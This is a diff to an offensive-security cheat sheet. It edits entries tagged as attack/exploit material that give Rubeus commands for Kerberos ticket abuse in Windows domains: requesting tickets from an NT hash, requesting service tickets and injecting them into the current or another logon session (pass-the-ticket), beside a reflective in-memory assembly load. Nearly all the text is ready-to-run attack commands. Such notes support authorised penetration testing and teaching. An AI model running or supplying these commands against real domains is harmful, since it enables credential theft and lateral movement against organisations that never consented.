@@ -184,13 +184,13 @@ $assem = [System.Reflection.Assembly]::Load($data)
 .\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt
 ```
 
-## asktgs - 
+## asktgs - and inject into current session (ptt)
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap
+.\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap /ptt
 ```
 
-## asktgt - and inject into another session (ptt)
+## asktgs - and inject into another session (ptt)
 #cat/ATTACK/EXPLOIT  
 ```powershell
 .\Rubeus.exe asktgs /ticket:<kirbi_path_or_b64_blob> /service:<spn_comma_sep_list> /nowrap /ptt /luid:<luid>
